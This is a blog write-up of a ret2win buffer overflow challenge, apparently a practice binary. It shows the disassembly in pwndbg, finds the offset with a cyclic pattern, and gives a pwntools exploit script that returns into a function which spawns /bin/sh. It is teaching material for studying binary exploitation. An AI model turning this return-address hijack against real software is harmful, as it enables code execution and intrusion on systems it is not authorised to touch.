---
title: "Overflow - 1"
date: 2020-10-20
description: "Return 2 win"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true
---

# Buffer Overflow (ret2win)

---

# ⚖️ Challenge Write-up

---

# General Analysis

![Untitled.png](https://hackmd.io/_uploads/rJdaI3UQ6.png)

# Function Analysis

```nasm
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010b0  puts@plt
0x00000000004010c0  setresuid@plt
0x00000000004010d0  setresgid@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  geteuid@plt
0x0000000000401100  gets@plt
0x0000000000401110  getegid@plt
0x0000000000401120  execl@plt
0x0000000000401130  _start
0x0000000000401160  _dl_relocate_static_pie
0x0000000000401170  deregister_tm_clones
0x00000000004011a0  register_tm_clones
0x00000000004011e0  __do_global_dtors_aux
0x0000000000401210  frame_dummy
0x0000000000401216  win
0x0000000000401259  init
0x00000000004012a6  main
0x0000000000401310  __libc_csu_init
0x0000000000401380  __libc_csu_fini
0x0000000000401388  _fini
pwndbg>

Disassembly of win
pwndbg> disass win
Dump of assembler code for function win:
   0x0000000000401216 <+0>:     endbr64
   0x000000000040121a <+4>:     push   rbp
   0x000000000040121b <+5>:     mov    rbp,rsp
   0x000000000040121e <+8>:     lea    rdi,[rip+0xddf]        # 0x402004
   0x0000000000401225 <+15>:    call   0x4010b0 <puts@plt>
   0x000000000040122a <+20>:    mov    r8d,0x0
   0x0000000000401230 <+26>:    lea    rcx,[rip+0xde5]        # 0x40201c
   0x0000000000401237 <+33>:    lea    rdx,[rip+0xde6]        # 0x402024
   0x000000000040123e <+40>:    lea    rsi,[rip+0xde2]        # 0x402027
   0x0000000000401245 <+47>:    lea    rdi,[rip+0xdd0]        # 0x40201c
   0x000000000040124c <+54>:    mov    eax,0x0
   0x0000000000401251 <+59>:    call   0x401120 <execl@plt>
   0x0000000000401256 <+64>:    nop
   0x0000000000401257 <+65>:    pop    rbp
   0x0000000000401258 <+66>:    ret
End of assembler dump.
pwndbg> x/s 0x40201c
0x40201c:       "/bin/sh"
```

# Exploit to find at what offset we have buffer overflow

```nasm
pwndbg> cyclic 64
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
pwndbg> r
Starting program: /home/shinjitsu/Youtube/Binary Exploitation/4. Ret2Win/ret2win 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Enter Your Name - aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaa
Value Of Number Is - 61616161

pwndbg> cyclic -l haaaaaaa
Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
Found at offset 56
```

- Thus anything more than 56 will get overflowed
- Writing out our exploit

```python
#!/usr/bin/python3

from pwn import *

elf = context.binary = ELF('ret2win')

p = process('./ret2win')
payload = cyclic(56) + p64(elf.sym.win)
p.sendline(payload)
p.interactive()
```

# Output

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 1866
[*] Switching to interactive mode
Enter Your Name - Value Of Number Is - 6161616c
[+] PWNED!!!
$ ls
exploit.py  README.md  ret2win    ret2win.c

Thus we got the shell!!!!!!
```
